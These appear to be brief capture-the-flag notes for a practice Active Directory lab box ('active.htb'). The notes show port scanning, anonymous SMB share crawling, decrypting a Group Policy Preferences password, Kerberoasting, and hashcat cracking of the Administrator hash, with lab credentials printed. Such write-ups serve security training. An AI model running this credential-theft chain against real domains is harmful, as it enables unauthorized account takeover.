```
nmap --min-rate 10 10.10.10.100 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-23 17:14 EDT
Nmap scan report for 10.10.10.100
Host is up (0.024s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
49173/tcp open  unknown
```

- `netexec smb 10.10.10.100 -u '' -p '' --share 'Replication' -M spider_plus -o Download_FLAG=True`
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

- svc_tgs:GPPstillStandingStrong2k18

- Get flag by using smbclient with above creds

- No winrm, no files to lead anywhere
- check users that are kerberoastable
    - `impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/svc_tgs -request`

- `hashcat -m 13100 admin.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator:Ticketmaster1968
```
